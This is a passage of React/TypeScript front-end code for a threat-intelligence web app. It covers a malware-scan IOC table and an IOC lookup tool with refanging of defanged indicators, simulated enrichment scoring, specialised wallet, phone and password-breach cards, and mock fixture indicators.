                Filesystem Modifications ({activeReport.fileActivity.length})
              </h4>
              {activeReport.fileActivity.map((fa, i) => (
                <div
                  key={i}
                  className="p-2.5 rounded-lg border text-xs space-y-1"
                  style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                >
                  <div className="flex items-center justify-between">
                    <span className="sc-mono font-bold text-amber-400">{fa.action}</span>
                    <span className="sc-mono text-[10px]">{fa.size}</span>
                  </div>
                  <div className="sc-mono text-[11px] break-all">{fa.path}</div>
                  <div className="text-[10px]" style={{ color: 'var(--color-text-secondary)' }}>
                    Process: {fa.process}
                  </div>
                </div>
              ))}
            </div>

            <div className="rounded-xl p-4 sc-surface space-y-2.5">
              <h4 className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
                Registry Modifications ({activeReport.registryActivity.length})
              </h4>
              {activeReport.registryActivity.map((ra, i) => (
                <div
                  key={i}
                  className="p-2.5 rounded-lg border text-xs space-y-1"
                  style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                >
                  <div className="sc-mono font-bold text-red-400">{ra.action}</div>
                  <div className="sc-mono text-[11px] break-all">{ra.key}</div>
                  <div className="sc-mono text-[10px]" style={{ color: 'var(--color-text-secondary)' }}>
                    Value: {ra.value}
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* 8.9 Sub-Tab: IOCs */}
      {!scanning && subTab === 'iocs' && (
        <div className="rounded-xl p-5 sc-surface space-y-4">
          <div className="flex flex-col md:flex-row md:items-center justify-between gap-3">
            <div className="flex flex-wrap items-center gap-1.5">
              {['All', 'URLs', 'IPs', 'Domains', 'Hashes', 'Registry', 'Paths'].map((pill) => (
                <button
                  key={pill}
                  type="button"
                  onClick={() => setIocTypeFilter(pill)}
                  className={`px-3 py-1 rounded-full text-xs font-semibold cursor-pointer ${
                    iocTypeFilter === pill ? 'sc-accent-bg text-white' : 'border'
                  }`}
                  style={iocTypeFilter === pill ? {} : { borderColor: 'var(--color-border)', color: 'var(--color-text-secondary)' }}
                >
                  {pill}
                </button>
              ))}
            </div>

            <div className="flex flex-wrap items-center gap-2">
              <input
                type="text"
                value={iocSearch}
                onChange={(e) => setIocSearch(e.target.value)}
                placeholder="Search IOC value or context..."
                className="px-3 py-1.5 rounded-lg text-xs sc-mono border"
                style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
              />
              <button
                type="button"
                onClick={() => {
                  downloadFileBlob(`${activeReport.filename}-iocs.json`, JSON.stringify(filteredIocs, null, 2));
                  onAddToast({ type: 'success', title: 'Exported IOCs (JSON)', description: `${filteredIocs.length} IOCs exported.` });
                }}
                className="px-3 py-1.5 rounded-lg text-xs font-medium border cursor-pointer"
                style={{ borderColor: 'var(--color-border)' }}
              >
                Export JSON
              </button>
            </div>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs border-collapse">
              <thead>
                <tr className="border-b" style={{ borderColor: 'var(--color-border)', color: 'var(--color-text-secondary)' }}>
                  <th className="py-2.5 px-3">Type</th>
                  <th className="py-2.5 px-3">Indicator Value</th>
                  <th className="py-2.5 px-3">Extraction Source</th>
                  <th className="py-2.5 px-3">Context</th>
                  <th className="py-2.5 px-3 text-right">Cross-Tool Pivot Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y" style={{ borderColor: 'var(--color-border-subtle)' }}>
                {filteredIocs.map((ioc, idx) => (
                  <tr key={idx}>
                    <td className="py-2.5 px-3">
                      <VerdictBadge verdict={ioc.verdict} label={ioc.type} />
                    </td>
                    <td className="py-2.5 px-3 sc-mono font-bold break-all">{ioc.value}</td>
                    <td className="py-2.5 px-3" style={{ color: 'var(--color-text-secondary)' }}>
                      {ioc.source}
                    </td>
                    <td className="py-2.5 px-3" style={{ color: 'var(--color-text-secondary)' }}>
                      {ioc.context}
                    </td>
                    <td className="py-2.5 px-3 text-right">
                      <div className="inline-flex items-center gap-1.5">
                        <button
                          type="button"
                          onClick={() => {
                            copyTextToClipboard(ioc.value);
                            onAddToast({ type: 'info', title: 'Copied IOC', description: ioc.value });
                          }}
                          className="px-2 py-1 rounded border text-[11px] cursor-pointer"
                          style={{ borderColor: 'var(--color-border)' }}
                        >
                          Copy
                        </button>
                        <button
                          type="button"
                          onClick={() =>
                            onPinIoc({
                              value: ioc.value,
                              type: 'ip',
                              sourceTool: 'malware',
                              sourceContext: activeReport.filename,
                              verdict: ioc.verdict
                            })
                          }
                          className="px-2 py-1 rounded border text-[11px] cursor-pointer"
                          style={{ borderColor: 'var(--color-border)' }}
                        >
                          📌 Pin
                        </button>
                        <button
                          type="button"
                          onClick={() =>
                            onPivot({
                              fromTool: 'malware',
                              fromLabel: `Malware scan: ${activeReport.filename}`,
                              fromMainTab: 'investigation',
                              fromSubTab: 'iocs',
                              toTool: 'ioc',
                              toMainTab: 'lookup',
                              toSubTab: 'lookup',
                              indicatorValue: ioc.value,
                              indicatorType: ioc.type
                            })
                          }
                          className="px-2.5 py-1 rounded text-[11px] font-semibold text-white sc-accent-bg cursor-pointer"
                        >
                          Pivot to IOC Lookup →
                        </button>
                        <button
                          type="button"
                          onClick={() =>
                            onPivot({
                              fromTool: 'malware',
                              fromLabel: `Malware scan: ${activeReport.filename}`,
                              fromMainTab: 'investigation',
                              fromSubTab: 'iocs',
                              toTool: 'events',
                              toMainTab: 'investigation',
                              toSubTab: 'events',
                              indicatorValue: ioc.value,
                              indicatorType: ioc.type
                            })
                          }
                          className="px-2 py-1 rounded border text-[11px] cursor-pointer"
                          style={{ borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
                        >
                          Search EVTX →
                        </button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* Upload Modal */}
      <Modal
        open={uploadModalOpen}
        title="🔬 New Malware Analysis Scan"
        subtitle="Upload a binary, document, script, or password-protected archive (Max 50 MB)"
        onClose={() => setUploadModalOpen(false)}
      >
        {renderUploadModalContent()}
      </Modal>
    </div>
  );
};
// ============================================================================
// 10. TOOL 2: IOC LOOKUP PLATFORM (Section 9 — #/t/ioc & #/t/ioc/lookup)
// ============================================================================
const IOC_PIPELINE_STAGES = ['Classify', 'Query Sources', 'Score', 'Enrich'];

function refangIndicator(raw: string): { cleaned: string; wasDefanged: boolean } {
  const trimmed = raw.trim();
  const cleaned = trimmed
    .replace(/\[\.\]/g, '.')
    .replace(/\(\.\)/g, '.')
    .replace(/^hxxps:\/\//i, 'https://')
    .replace(/^hxxp:\/\//i, 'http://')
    .replace(/\[:\]/g, ':');
  return { cleaned, wasDefanged: cleaned !== trimmed };
}

export const IocTool: React.FC<{
  mainTab: string;
  subTab: string;
  setMainTab: (t: string) => void;
  setSubTab: (s: string) => void;
  activeQuery: string;
  setActiveQuery: (q: string) => void;
  batchPrefill: string[];
  onClearBatchPrefill: () => void;
  onPivot: (req: Omit<PivotRequest, 'id' | 'timestamp'>) => void;
  onPinIoc: (item: Omit<IOCClipboardItem, 'id' | 'addedAt'>) => void;
  onAddToast: (t: Omit<ToastMessage, 'id'>) => void;
  userRole: UserRole;
}> = ({
  mainTab,
  subTab,
  setMainTab,
  setSubTab,
  activeQuery,
  setActiveQuery,
  batchPrefill,
  onClearBatchPrefill,
  onPivot,
  onPinIoc,
  onAddToast,
  userRole
}) => {
  const [searchInput, setSearchInput] = useState(activeQuery || '198.51.100.45');
  const [pipelineRunning, setPipelineRunning] = useState(false);
  const [pipelineStage, setPipelineStage] = useState(0);
  const [resultTab, setResultTab] = useState<'investigation' | 'enrichment' | 'sources' | 'relationships' | 'export'>('investigation');
  const [exportFormat, setExportFormat] = useState<'CSV' | 'STIX 2.1' | 'MISP' | 'SIEM' | 'HTML Report'>('STIX 2.1');
  const [showCoverageInfo, setShowCoverageInfo] = useState(false);

  // Feedback Widget state
  const [feedbackVote, setFeedbackVote] = useState<'yes' | 'no' | 'unsure' | null>(null);
  const [feedbackCorrection, setFeedbackCorrection] = useState('suspicious');
  const [feedbackNotes, setFeedbackNotes] = useState('');
  const [feedbackSubmitted, setFeedbackSubmitted] = useState(false);

  // Relationship Graph state
  const [graphViewMode, setGraphViewMode] = useState<'graph' | 'table'>('graph');
  const [minConnections, setMinConnections] = useState(1);
  const [nodeTypeFilter, setNodeTypeFilter] = useState<Record<string, boolean>>({
    IP: true,
    Domain: true,
    Hash: true,
    URL: true,
    Email: true
  });

  // Investigations (Cases) state
  const [cases, setCases] = useState(MORE_FIXTURES.iocCases);
  const [selectedCaseId, setSelectedCaseId] = useState(MORE_FIXTURES.iocCases[0].id);
  const [newCaseName, setNewCaseName] = useState('');
  const [newCaseIoc, setNewCaseIoc] = useState('');
  const [newCaseNote, setNewCaseNote] = useState('');

  // Batch state
  const [batchText, setBatchText] = useState(
    '198.51.100.45\nevil-login-portal.com\na4f8d91c8b2e47f9012c65b88e73a91c0d4b76e2f8a1234567890abcdef1e31b\nbc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n+1-415-890-9912\npassword:Summer2026!\n8.8.8.8'
  );
  const [batchRunning, setBatchRunning] = useState(false);
  const [batchProgress, setBatchProgress] = useState(100);
  const [batchVerdictFilter, setBatchVerdictFilter] = useState('all');
  const [batchSearch, setBatchSearch] = useState('');
  const [batchResults, setBatchResults] = useState([
    { ioc: '198.51.100.45', type: 'IPv4', verdict: 'malicious' as VerdictType, score: 92 },
    { ioc: 'evil-login-portal.com', type: 'Domain', verdict: 'malicious' as VerdictType, score: 89 },
    { ioc: 'a4f8d91c8b2e47f9012c65b88e73a91c0d4b76e2f8a1234567890abcdef1e31b', type: 'SHA-256', verdict: 'malicious' as VerdictType, score: 87 },
    { ioc: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', type: 'BTC Wallet', verdict: 'malicious' as VerdictType, score: 88 },
    { ioc: '+1-415-890-9912', type: 'Phone', verdict: 'suspicious' as VerdictType, score: 68 },
    { ioc: 'password:Summer2026! (SHA1:7B520...)', type: 'Password Hash', verdict: 'malicious' as VerdictType, score: 95 },
    { ioc: '8.8.8.8', type: 'IPv4', verdict: 'clean' as VerdictType, score: 2 }
  ]);

  // History state
  const [historyList, setHistoryList] = useState(MORE_FIXTURES.iocHistory);
  const [historySearch, setHistorySearch] = useState('');

  useEffect(() => {
    if (activeQuery && activeQuery !== searchInput) {
      setSearchInput(activeQuery);
    }
  }, [activeQuery]);

  useEffect(() => {
    if (batchPrefill && batchPrefill.length > 0) {
      setBatchText(batchPrefill.join('\n'));
      onClearBatchPrefill();
    }
  }, [batchPrefill, onClearBatchPrefill]);

  const executeLookup = (rawQuery: string) => {
    const { cleaned, wasDefanged } = refangIndicator(rawQuery);
    setSearchInput(cleaned);
    setActiveQuery(cleaned);
    setMainTab('lookup');
    setSubTab('lookup');
    setPipelineRunning(true);
    setPipelineStage(0);
    setFeedbackSubmitted(false);
    setFeedbackVote(null);

    if (wasDefanged) {
      onAddToast({
        type: 'info',
        title: 'Auto-Refanged Indicator',
        description: `Normalized "${rawQuery}" → "${cleaned}"`
      });
    }

    let stg = 0;
    const interval = setInterval(() => {
      stg += 1;
      if (stg >= 4) {
        clearInterval(interval);
        setPipelineRunning(false);
        setHistoryList((prev) => [
          {
            id: `hist-${Date.now()}`,
            ioc: cleaned,
            type: cleaned.includes(':') ? 'Specialized IOC' : cleaned.includes('.') ? 'IP/Domain' : 'Hash',
            verdict: cleaned === '8.8.8.8' ? 'clean' : 'malicious',
            score: cleaned === '8.8.8.8' ? 2 : 92,
            timestamp: 'Just now',
            cached: false
          },
          ...prev.filter((h) => h.ioc !== cleaned)
        ]);
      } else {
        setPipelineStage(stg);
      }
    }, 220);
  };

  const activeProfile = useMemo(() => {
    const key = activeQuery as keyof typeof MORE_FIXTURES.iocProfiles;
    if (MORE_FIXTURES.iocProfiles[key]) {
      return MORE_FIXTURES.iocProfiles[key];
    }
    const base = MORE_FIXTURES.iocProfiles['198.51.100.45'];
    if (activeQuery === '8.8.8.8') {
      return {
        ...base,
        ioc: '8.8.8.8',
        type: 'IPv4 Address (Google Public DNS)',
        verdict: 'clean' as VerdictType,
        score: 2,
        whyVerdict: 'Verified benign public DNS resolver operated by Google LLC (AS15169). 0/28 intelligence providers report malicious activity.',
        votes: { malicious: 0, suspicious: 0, clean: 26, unknown: 7 }
      };
    }
    return {
      ...base,
      ioc: activeQuery || '198.51.100.45',
      type: activeQuery.length === 64 ? 'SHA-256 Hash' : activeQuery.includes('http') ? 'URL' : 'Domain / IPv4 Indicator'
    };
  }, [activeQuery]);

  const baseProfile = MORE_FIXTURES.iocProfiles['198.51.100.45'];

  const runBatchEnrichment = () => {
    const lines = batchText
      .split('\n')
      .map((l) => refangIndicator(l).cleaned)
      .filter(Boolean)
      .slice(0, 100);
    if (lines.length === 0) return;
    setBatchRunning(true);
    setBatchProgress(20);
    setTimeout(() => {
      setBatchProgress(100);
      setBatchRunning(false);
      const computed = lines.map((line) => {
        const isPass = line.toLowerCase().startsWith('password:');
        const isClean = line === '8.8.8.8' || line === '1.1.1.1';
        return {
          ioc: isPass ? `${line.slice(0, 12)}*** (WebCrypto SHA-1: 7B520...)` : line,
          type: isPass ? 'Password SHA-1' : line.length === 64 ? 'SHA-256' : line.startsWith('bc1') ? 'BTC Wallet' : line.startsWith('+') ? 'Phone' : /^\d+\.\d+\.\d+\.\d+$/.test(line) ? 'IPv4' : 'Domain/URL',
          verdict: (isClean ? 'clean' : line.startsWith('+') ? 'suspicious' : 'malicious') as VerdictType,
          score: isClean ? 2 : line.startsWith('+') ? 68 : 91
        };
      });
      setBatchResults(computed);
      onAddToast({
        type: 'success',
        title: 'Batch IOC Enrichment Complete',
        description: `Processed ${computed.length} indicators via SSE pipeline.`
      });
    }, 550);
  };

  if (mainTab === 'overview') {
    return (
      <ToolOverviewTemplate
        tool={TOOLS_REGISTRY.ioc}
        stats={[
          { label: 'Configured Threat Feeds', value: '28 / 33 Active' },
          { label: 'Supported Indicator Types', value: '31 Formats' },
          { label: 'Batch Processing Capacity', value: '100 IOCs / SSE Stream' },
          { label: 'Export Schemas', value: 'STIX 2.1 · MISP · ECS · CSV' }
        ]}
        doesList={[
          'Automatically detects and refangs defanged indicators (198.51.100[.]45, hxxps://) and classifies 31 indicator types.',
          'Queries 33 threat intelligence providers in parallel and computes a weighted 0–100 consensus score.',
          'Provides specialized intelligence cards for Bitcoin/Ethereum wallets, E.164 phone numbers, and client-side WebCrypto SHA-1 password breach checks.',
          'Renders force-directed IOC relationship graphs and exports directly to STIX 2.1, MISP, Splunk/ECS/LEEF, CSV, and HTML.'
        ]}
        doesNotList={[
          'Never transmits plaintext passwords over the network — `password:` queries are hashed client-side using WebCrypto SHA-1 k-anonymity.',
          'Never spends live API quota when reloading historical cached lookups unless "Re-scan Live" is explicitly clicked.'
        ]}
        terminalTitle="secconflux-ioc-cli lookup 198.51.100.45 --sources=all --format=json"
        terminalOutput={`{\n  "indicator": "198.51.100.45",\n  "type": "IPv4",\n  "verdict": "MALICIOUS",\n  "composite_score": 92,\n  "consensus_votes": { "malicious": 19, "suspicious": 4, "clean": 3, "unknown": 7 },\n  "shodan_ports": [22, 80, 443, 8443, 50050],\n  "ja3s_signature": "Cobalt Strike TeamServer Default"\n}`}
        ctaLabel="Launch IOC Lookup →"
        onStart={() => {
          setMainTab('lookup');
          setSubTab('lookup');
        }}
      />
    );
  }

  return (
    <div className="space-y-5 max-w-7xl mx-auto pb-12">
      {/* Header Contextual Search & Coverage Bar */}
      <div className="rounded-xl p-3.5 sc-surface flex flex-col md:flex-row md:items-center justify-between gap-3">
        <div className="flex-1 flex items-center gap-2">
          <input
            type="text"
            value={searchInput}
            onChange={(e) => setSearchInput(e.target.value)}
            onKeyDown={(e) => {
              if (e.key === 'Enter' && searchInput.trim()) executeLookup(searchInput);
            }}
            placeholder="Enter IP, domain, SHA256, URL, BTC wallet, phone (+1...), or password:secret (auto-refangs [.] and hxxps)"
            className="w-full px-3.5 py-2 rounded-lg text-xs sc-mono border"
            style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
          />
          <button
            type="button"
            onClick={() => executeLookup(searchInput)}
            className="px-4 py-2 rounded-lg text-xs font-semibold text-white sc-accent-bg shrink-0 cursor-pointer"
          >
            Lookup IOC
          </button>
        </div>

        <div className="flex items-center gap-2">
          <button
            type="button"
            onClick={() => setShowCoverageInfo(!showCoverageInfo)}
            className="px-3 py-1.5 rounded-lg text-xs font-semibold border flex items-center gap-1.5 cursor-pointer"
            style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)' }}
          >
            <span className="w-2 h-2 rounded-full bg-emerald-400" />
            <span>28 / 33 Sources Active</span>
          </button>
        </div>
      </div>

      {showCoverageInfo && (
        <div className="rounded-xl p-4 sc-surface-raised text-xs space-y-2">
          <div className="flex items-center justify-between">
            <span className="font-bold">Configured Threat Intelligence Sources (28 Active · 5 Enterprise Keys Missing)</span>
            <button type="button" onClick={() => setShowCoverageInfo(false)} className="text-xs underline cursor-pointer">
              Close
            </button>
          </div>
          <p style={{ color: 'var(--color-text-secondary)' }}>
            Active: VirusTotal, AbuseIPDB, Shodan, AlienVault OTX, GreyNoise, ThreatFox, URLHaus, MalwareBazaar, FeodoTracker, urlscan.io, Hudson Rock, Censys, CrowdSec, Pulsedive, crt.sh, WHOIS, DNS, HIBP k-Anonymity, Blockchair, BGPView, PhishTank, OpenPhish, Spamhaus, Talos, IPInfo, Robtex, SecurityTrails, Cloudflare Radar. Missing optional keys: Recorded Future, Mandiant, DomainTools, Intel471, Flashpoint.
          </p>
        </div>
      )}

      {/* 9.3 Sub-Tab: Lookup */}
      {subTab === 'lookup' && (
        <div className="space-y-5">
          {/* Quick Sample Indicator Pills */}
          <div className="flex flex-wrap items-center gap-2 text-xs">
            <span style={{ color: 'var(--color-text-secondary)' }}>Quick Samples:</span>
            {[
              { label: 'C2 IP: 198.51.100[.]45 (Auto-Refang)', val: '198.51.100[.]45' },
              { label: 'Domain: evil-login-portal.com', val: 'evil-login-portal.com' },
              { label: 'BTC Wallet: bc1qxy2...', val: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh' },
              { label: 'Phone: +1-415-890-9912', val: '+1-415-890-9912' },
              { label: 'Breached Password (k-Anon)', val: 'password:Summer2026!' },
              { label: 'Benign DNS: 8.8.8.8', val: '8.8.8.8' }
            ].map((smp) => (
              <button
                key={smp.val}
                type="button"
                onClick={() => executeLookup(smp.val)}
                className="px-2.5 py-1 rounded-full border sc-mono text-[11px] hover:opacity-90 cursor-pointer"
                style={{ backgroundColor: 'var(--color-surface)', borderColor: 'var(--color-border)' }}
              >
                {smp.label}
              </button>
            ))}
          </div>

          {/* 4-Stage Pipeline Progress Bar */}
          {pipelineRunning && (
            <div className="rounded-xl p-5 sc-surface space-y-3">
              <div className="flex items-center justify-between text-xs">
                <span className="font-bold">Executing 4-Stage Enrichment Pipeline for {activeQuery}...</span>
                <button
                  type="button"
                  onClick={() => setPipelineRunning(false)}
                  className="text-red-400 underline cursor-pointer"
                >
                  Cancel
                </button>
              </div>
              <div className="grid grid-cols-4 gap-2">
                {IOC_PIPELINE_STAGES.map((stg, i) => (
                  <div
                    key={stg}
                    className="p-2.5 rounded-lg border text-xs text-center font-semibold"
                    style={{
                      backgroundColor: i <= pipelineStage ? 'var(--color-surface-raised)' : 'var(--color-canvas)',
                      borderColor: i === pipelineStage ? 'var(--color-border-focus)' : i < pipelineStage ? 'var(--color-clean)' : 'var(--color-border)'
                    }}
                  >
                    {i < pipelineStage ? '✓ ' : i === pipelineStage ? '⟳ ' : ''}
                    {stg}
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* ResultView Internal Sub-Tabs */}
          <div className="rounded-xl p-5 sc-surface space-y-5">
            {/* Top Summary Banner */}
            <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4 pb-4 border-b" style={{ borderColor: 'var(--color-border)' }}>
              <div className="flex items-center gap-4">
                <ScoreRing score={activeProfile.score} max={100} size={80} label={activeProfile.verdict.toUpperCase()} />
                <div className="space-y-1">
                  <div className="flex flex-wrap items-center gap-2">
                    <VerdictBadge verdict={activeProfile.verdict} size="md" />
                    <span className="sc-mono text-xs px-2 py-0.5 rounded border" style={{ borderColor: 'var(--color-border)', color: 'var(--color-text-secondary)' }}>
                      {activeProfile.type}
                    </span>
                  </div>
                  <h2 className="text-lg font-bold sc-mono break-all">{activeProfile.ioc}</h2>
                  <p className="text-xs max-w-2xl leading-relaxed" style={{ color: 'var(--color-text-secondary)' }}>
                    {activeProfile.whyVerdict}
                  </p>
                </div>
              </div>

              <div className="flex flex-wrap items-center gap-2 shrink-0">
                <button
                  type="button"
                  onClick={() =>
                    onPinIoc({
                      value: activeProfile.ioc,
                      type: 'ip',
                      sourceTool: 'ioc',
                      sourceContext: `Score ${activeProfile.score}/100`,
                      verdict: activeProfile.verdict
                    })
                  }
                  className="px-3 py-1.5 rounded-lg text-xs font-medium border cursor-pointer"
                  style={{ borderColor: 'var(--color-border)' }}
                >
                  📌 Pin to Clipboard
                </button>
                <button
                  type="button"
                  onClick={() =>
                    onPivot({
                      fromTool: 'ioc',
                      fromLabel: `IOC Lookup: ${activeProfile.ioc}`,
                      fromMainTab: 'lookup',
                      fromSubTab: 'lookup',
                      toTool: 'events',
                      toMainTab: 'investigation',
                      toSubTab: 'events',
                      indicatorValue: activeProfile.ioc,
                      indicatorType: activeProfile.type
                    })
                  }
                  className="px-3 py-1.5 rounded-lg text-xs font-semibold text-white sc-accent-bg cursor-pointer"
                >
                  Search Windows Events →
                </button>
                <button
                  type="button"
                  onClick={() =>
                    onPivot({
                      fromTool: 'ioc',
                      fromLabel: `IOC Lookup: ${activeProfile.ioc}`,
                      fromMainTab: 'lookup',
                      fromSubTab: 'lookup',
                      toTool: 'phishing',
                      toMainTab: 'analysis',
                      toSubTab: 'dashboard',
                      indicatorValue: activeProfile.ioc,
                      indicatorType: activeProfile.type
                    })
                  }
                  className="px-3 py-1.5 rounded-lg text-xs font-medium border cursor-pointer"
                  style={{ borderColor: 'var(--color-border)' }}
                >
                  Check Phishing Emails →
                </button>
              </div>
            </div>

            {/* ResultView 5 Internal Tabs */}
            <div className="flex flex-wrap items-center gap-2 border-b pb-3" style={{ borderColor: 'var(--color-border-subtle)' }}>
              {[
                { id: 'investigation', label: '1. Investigation & Consensus' },
                { id: 'enrichment', label: '2. Deep Enrichment (Geo/DNS/SSL/Shodan)' },
                { id: 'sources', label: '3. Provider Audit (33 Sources)' },
                { id: 'relationships', label: '4. Relationship Graph (D3)' },
                { id: 'export', label: '5. Export (STIX / MISP / SIEM)' }
              ].map((t) => (
                <button
                  key={t.id}
                  type="button"
                  onClick={() => setResultTab(t.id as any)}
                  className={`px-3 py-1.5 rounded-lg text-xs font-semibold cursor-pointer ${
                    resultTab === t.id ? 'sc-accent-bg text-white' : 'border'
                  }`}
                  style={resultTab === t.id ? {} : { borderColor: 'var(--color-border)', color: 'var(--color-text-secondary)' }}
                >
                  {t.label}
                </button>
              ))}
            </div>

            {/* Internal Tab 1: Investigation */}
            {resultTab === 'investigation' && (
              <div className="space-y-5">
                {/* Consensus Voting Bar */}
                <div className="p-4 rounded-xl border space-y-2.5" style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}>
                  <div className="flex items-center justify-between text-xs">
                    <span className="font-bold uppercase tracking-wider">Multi-Provider Consensus Voting Bar</span>
                    <div className="flex items-center gap-3 sc-mono text-[11px]">
                      <span className="text-red-400">Malicious: {activeProfile.votes.malicious}</span>
                      <span className="text-amber-400">Suspicious: {activeProfile.votes.suspicious}</span>
                      <span className="text-emerald-400">Clean: {activeProfile.votes.clean}</span>
                      <span style={{ color: 'var(--color-text-tertiary)' }}>Unknown/Skipped: {activeProfile.votes.unknown}</span>
                    </div>
                  </div>
                  <div className="h-3 rounded-full overflow-hidden flex" style={{ backgroundColor: 'var(--color-canvas)' }}>
                    <div style={{ width: `${(activeProfile.votes.malicious / 33) * 100}%`, backgroundColor: 'var(--color-malicious)' }} />
                    <div style={{ width: `${(activeProfile.votes.suspicious / 33) * 100}%`, backgroundColor: 'var(--color-suspicious)' }} />
                    <div style={{ width: `${(activeProfile.votes.clean / 33) * 100}%`, backgroundColor: 'var(--color-clean)' }} />
                    <div style={{ width: `${(activeProfile.votes.unknown / 33) * 100}%`, backgroundColor: 'var(--color-unknown)' }} />
                  </div>
                </div>

                {/* Specialized Cards for Wallet, Phone, or Password Breach */}
                {'wallet' in activeProfile && activeProfile.wallet && (
                  <div className="p-4 rounded-xl border space-y-2" style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-malicious)' }}>
                    <h4 className="text-xs font-bold uppercase tracking-wider text-amber-400">₿ Cryptocurrency Wallet Intelligence Card</h4>
                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5 text-xs">
                      <CopyKV label="Chain" value={activeProfile.wallet.chain} />
                      <CopyKV label="Current Balance" value={activeProfile.wallet.balance} />
                      <CopyKV label="Total Received" value={activeProfile.wallet.totalReceived} />
                      <CopyKV label="Transactions" value={String(activeProfile.wallet.txCount)} />
                      <CopyKV label="Funding Sources" value={activeProfile.wallet.fundingSources.join(', ')} mono={false} />
                      <CopyKV label="Sanctions / Attribution" value={activeProfile.wallet.sanctionsCheck} mono={false} />
                    </div>
                  </div>
                )}

                {'phoneIntel' in activeProfile && activeProfile.phoneIntel && (
                  <div className="p-4 rounded-xl border space-y-2" style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-suspicious)' }}>
                    <h4 className="text-xs font-bold uppercase tracking-wider text-amber-400">📞 E.164 Phone & Vishing Intelligence Card</h4>
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5 text-xs">
                      <CopyKV label="Carrier" value={activeProfile.phoneIntel.carrier} mono={false} />
                      <CopyKV label="Line Type" value={activeProfile.phoneIntel.lineType} mono={false} />
                      <CopyKV label="Fraud Score" value={activeProfile.phoneIntel.fraudScore} />
                      <CopyKV label="Associated Campaigns" value={activeProfile.phoneIntel.recentCampaigns} mono={false} />
                    </div>
                  </div>
                )}

                {'passwordBreach' in activeProfile && activeProfile.passwordBreach && (
                  <div className="p-4 rounded-xl border space-y-2" style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-malicious)' }}>
                    <h4 className="text-xs font-bold uppercase tracking-wider text-red-400">🔐 Password Breach Card (Zero-Knowledge WebCrypto SHA-1)</h4>
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5 text-xs">
                      <CopyKV label="Breach Exposure Count" value={activeProfile.passwordBreach.exposureCount.toLocaleString() + ' hits'} />
                      <CopyKV label="k-Anonymity Prefix" value={activeProfile.passwordBreach.kPrefix} />
                      <CopyKV label="Breach Corpora" value={activeProfile.passwordBreach.sources.join(', ')} mono={false} />
                      <CopyKV label="Action" value={activeProfile.passwordBreach.recommendation} mono={false} />
                    </div>
                  </div>
                )}

                {/* Provider Evidence Cards */}
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                  {baseProfile.providers.slice(0, 9).map((prov) => (
                    <div
                      key={prov.name}
                      className="p-3.5 rounded-lg border space-y-1.5 text-xs"
                      style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                    >
                      <div className="flex items-center justify-between">
                        <span className="font-bold">{prov.name}</span>
                        <VerdictBadge verdict={prov.verdict} />
                      </div>
                      <p className="text-[11px] leading-relaxed" style={{ color: 'var(--color-text-secondary)' }}>
                        {prov.summary}
                      </p>
                      <div className="flex items-center justify-between text-[10px] sc-mono pt-1" style={{ color: 'var(--color-text-tertiary)' }}>
                        <span>Confidence: {prov.confidence}%</span>
                        <span>Latency: {prov.latency}</span>
                      </div>
                    </div>
                  ))}
                </div>

                {/* Inline Analyst Feedback Widget */}
                <div className="p-4 rounded-xl border space-y-3" style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)' }}>
                  <div className="flex flex-wrap items-center justify-between gap-2">
                    <span className="text-xs font-bold">Analyst Verdict Feedback: Is this composite verdict accurate?</span>
                    <div className="flex items-center gap-2">
                      {(['yes', 'no', 'unsure'] as const).map((opt) => (
                        <button
                          key={opt}
                          type="button"
                          onClick={() => {
                            setFeedbackVote(opt);
                            if (opt !== 'no') {
                              setFeedbackSubmitted(true);
                              onAddToast({ type: 'success', title: 'Feedback Recorded', description: `Submitted "${opt.toUpperCase()}" feedback to /api/ioc/feedback.` });
                            }
                          }}
                          className={`px-3 py-1 rounded text-xs font-semibold border cursor-pointer ${
                            feedbackVote === opt ? 'sc-accent-bg text-white' : ''
                          }`}
                          style={feedbackVote === opt ? {} : { borderColor: 'var(--color-border)' }}
                        >
                          {opt === 'yes' ? '👍 Yes' : opt === 'no' ? '👎 No' : '🤔 Unsure'}
                        </button>
                      ))}
                    </div>
                  </div>

                  {feedbackVote === 'no' && !feedbackSubmitted && (
                    <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-2 pt-2">
                      <select
                        value={feedbackCorrection}
                        onChange={(e) => setFeedbackCorrection(e.target.value)}
                        className="px-2.5 py-1.5 rounded text-xs border"
                        style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
                      >
                        <option value="clean">Correct Verdict: CLEAN</option>
                        <option value="suspicious">Correct Verdict: SUSPICIOUS</option>
                        <option value="malicious">Correct Verdict: MALICIOUS</option>
                      </select>
                      <input
                        type="text"
                        value={feedbackNotes}
